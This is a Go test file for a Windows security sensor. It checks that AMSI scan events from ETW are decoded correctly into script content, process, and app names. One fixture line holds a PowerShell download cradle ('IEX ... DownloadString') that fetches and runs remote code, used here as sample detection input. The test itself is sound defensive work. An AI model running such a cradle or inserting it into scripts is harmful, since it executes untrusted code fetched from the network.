package winsensor

import (
	"encoding/hex"
	"strings"
	"testing"
	"unicode/utf16"

	"github.com/siem-platform/agent/internal/etw"
)

func utf16hex(s string) string {
	var b []byte
	for _, r := range utf16.Encode([]rune(s)) {
		b = append(b, byte(r), byte(r>>8))
	}
	return "0x" + strings.ToUpper(hex.EncodeToString(b))
}

func TestAMSIScriptFromEvent(t *testing.T) {
	j := joiner()
	j.remember(&process{pid: 4242, image: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`})
	ev := &etw.Event{Provider: amsiProvider, ID: amsiScanEvent, PID: 4242, Props: []etw.Property{
		{Name: "session", Value: "0x1"}, {Name: "scanStatus", Value: "1"}, {Name: "scanResult", Value: "1"},
		{Name: "appname", Value: "PowerShell_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe_10.0.19041.1"},
		{Name: "contentname", Value: ""}, {Name: "contentsize", Value: "76"}, {Name: "originalsize", Value: "76"},
		{Name: "content", Value: utf16hex("IEX (New-Object Net.WebClient).DownloadString('http://x')")},
	}}
	sc, ok := j.amsiScript(ev)
	if !ok || sc.PID != 4242 || !strings.HasSuffix(sc.Image, `\powershell.exe`) ||
		string(sc.Content) != "IEX (New-Object Net.WebClient).DownloadString('http://x')" ||
		!strings.HasPrefix(sc.App, "PowerShell_") {
		t.Fatalf("decoded %+v %q", sc, sc.Content)
	}
	if _, ok := j.amsiScript(&etw.Event{ID: 1102}); ok {
		t.Fatal("only event 1101")
	}
	if _, ok := j.amsiScript(&etw.Event{ID: amsiScanEvent, Props: []etw.Property{{Name: "content", Value: "zz"}}}); ok {
		t.Fatal("bad hex")
	}
}

func TestAMSIBinaryContentStaysBinary(t *testing.T) {
	pe := []byte{'M', 'Z', 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0xff, 0xff, 0xb8, 0x01}
	if got := decodeAMSIContent(pe); string(got) != string(pe) {
		t.Fatalf("a .NET assembly is not UTF-16 text: %q", got)
	}
}
